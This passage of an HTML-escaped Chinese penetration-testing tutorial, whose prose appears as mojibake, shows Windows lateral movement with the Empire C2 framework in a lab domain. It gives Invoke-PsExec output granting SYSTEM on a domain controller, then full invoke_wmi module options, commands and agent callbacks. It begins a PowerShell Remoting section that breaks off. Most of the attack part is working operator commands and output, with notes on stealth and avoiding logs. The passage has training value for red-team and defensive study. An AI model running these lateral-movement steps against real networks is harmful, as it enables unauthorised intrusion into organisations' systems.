&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Job started: YXPMKF
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Invoke-PsExec completed!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; New agent AU6PZ3M5 checked in
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Sending agent &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;stage 2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; to AU6PZ3M5 at 172.16.0.106
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: 7VLBMT3A&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; back
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: agents&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; list
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯ä»¥çœ‹åˆ°åŸŸæ§&lt;code&gt;106&lt;/code&gt;å·²ç»ä¸Šçº¿äº†ï¼Œè€Œä¸”è¿˜æ˜¯systemæƒé™ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//17.png&#34; alt=&#34;17&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;invoke-wmi&#34;&gt;Invoke-WMI&lt;/h3&gt;
&lt;p&gt;æ‰€æœ‰çš„Windowsç³»ç»Ÿéƒ½å¯ç”¨äº†è¯¥è®¿é—®ï¼Œwmiä¼šæ¯”PsExecå®‰å…¨ï¼Œå› ä¸ºä½¿ç”¨wmiexecæ”»å‡»çš„æ—¶å€™ï¼ŒWindowsé»˜è®¤ä¸ä¼šç•™ä¸‹æ—¥å¿—ï¼Œè€Œä¸”æ”»å‡»çš„è„šæœ¬ä¹Ÿä¸éœ€è¦å†™å…¥ç¡¬ç›˜ï¼Œå…·æœ‰å¾ˆé«˜çš„éšè”½æ€§ï¼Œå¦‚æœç›®æ ‡æœºå™¨å¼€å¯äº†é˜²ç«å¢™å¯ä»¥ä¼šå¯¼è‡´wmiæ— æ³•è¿æ¥ã€‚&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨æ¨¡å—&lt;code&gt;lateral_movement/invoke_wmi&lt;/code&gt;è¿›è¡Œæ”»å‡»ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: 7VLBMT3A&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; whoami
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Tasked 7VLBMT3A to run Task &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HACK&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;estuser
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: 7VLBMT3A&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; usemodule powershell/lateral_movement/invoke_wmi
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set Agent to 7VLBMT3A
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Author       @harmj0y                                     
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Background   False                                        
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Description  Executes a stager on remote hosts using WMI. 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Language     powershell                                   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Name         powershell/lateral_movement/invoke_wmi       
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; NeedsAdmin   False                                        
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; OpsecSafe    True                                         
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Techniques   http://attack.mitre.org/techniques/T1047     
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”ŒRecord Optionsâ”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Name             â”‚ Value       â”‚ Required â”‚ Description                         â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Agent            â”‚ 7VLBMT3A    â”‚ True     â”‚ Agent to run module on.             â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Bypasses         â”‚ False       â”‚ False    â”‚ Bypasses as a space separated list  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚             â”‚          â”‚ to be prepended to the launcher.    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Command          â”‚             â”‚ False    â”‚ Custom &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; to run.              â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ ComputerName     â”‚             â”‚ True     â”‚ Host&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; to execute the stager on,   â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚             â”‚          â”‚ comma separated.                    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ CredID           â”‚             â”‚ False    â”‚ CredID from the store to use.       â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Listener         â”‚             â”‚ False    â”‚ Listener to use.                    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Obfuscate        â”‚ False       â”‚ False    â”‚ Switch. Obfuscate the launcher      â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚             â”‚          â”‚ powershell code, uses the           â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚             â”‚          â”‚ ObfuscateCommand &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; obfuscation    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚             â”‚          â”‚ types. For powershell only.         â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ ObfuscateCommand â”‚ Token&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;ll&lt;span class=&#34;se&#34;&gt;\1&lt;/span&gt; â”‚ False    â”‚ The Invoke-Obfuscation &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; to   â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚             â”‚          â”‚ use. Only used &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; Obfuscate switch  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚             â”‚          â”‚ is True. For powershell only.       â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Password         â”‚             â”‚ False    â”‚ Password to use to execute command. â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Proxy            â”‚ default     â”‚ False    â”‚ Proxy to use &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; request &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;default,  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚             â”‚          â”‚ none, or other&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.                    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ ProxyCreds       â”‚ default     â”‚ False    â”‚ Proxy credentials                   â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚             â”‚          â”‚ &lt;span class=&#34;o&#34;&gt;([&lt;/span&gt;domain&lt;span class=&#34;se&#34;&gt;\]&lt;/span&gt;username:password&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; to use â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚             â”‚          â”‚ &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; request &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;default, none, or      â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚             â”‚          â”‚ other&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.                             â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ UserAgent        â”‚ default     â”‚ False    â”‚ User-agent string to use &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚             â”‚          â”‚ staging request &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;default, none, or  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚             â”‚          â”‚ other&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.                             â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ UserName         â”‚             â”‚ False    â”‚ &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;domain&lt;span class=&#34;se&#34;&gt;\]&lt;/span&gt;username to use to execute â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚             â”‚          â”‚ command.                            â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/lateral_movement/invoke_wmi&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; ComputerName dc.hack.lab
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set ComputerName to dc.hack.lab
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/lateral_movement/invoke_wmi&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; Listener &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set Listener to &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/lateral_movement/invoke_wmi&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; execute
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Tasked 7VLBMT3A to run Task &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; New agent DUT5CV6G checked in
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Sending agent &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;stage 2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; to DUT5CV6G at 172.16.0.106
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: 7VLBMT3A&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; back
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: agents&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; list
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯ä»¥çœ‹åˆ°å·²ç»åå¼¹æˆåŠŸï¼Œè€Œä¸”æƒé™ä¸æ˜¯åƒPsExecä¸€æ ·æœ‰systemæƒé™ï¼Œä½†æ˜¯å¸¦æœ‰äº†æ˜Ÿå·ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//18.png&#34; alt=&#34;18&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;powershell-remoting&#34;&gt;Powershell Remoting&lt;/h3&gt;
&lt;p&gt;è¯¥åŠŸèƒ½æ˜¯Powershellè¿œç¨‹ç®¡ç†åŠŸèƒ½ï¼Œå¼€å¯WinRMæœåŠ¡ä¼šç”Ÿæˆä¸€ä¸ªç›‘å¬ç«¯å£5985ï¼Œè¯¥æœåŠ¡åœ¨Windows Server 2012 ä»¥ä¸Šæ˜¯é»˜è®¤å¼€å¯çš„ï¼Œåœ¨ä¹‹å‰çš„ç³»ç»Ÿæ˜¯è¦æ‰‹åŠ¨æ¥å¼€å¯æ‰è¡Œã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœç›®æ ‡å¯ç”¨äº†Powershell Remotingï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨åŸŸç”¨æˆ·å¯¹å…¶è¿›è¡Œæ¨ªå‘æ¸—é€ï¼Œä½¿ç”¨çš„æ¨¡å—æ˜¯&lt;code&gt;invoke_psremoting &lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: 7VLBMT3A&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; whoami
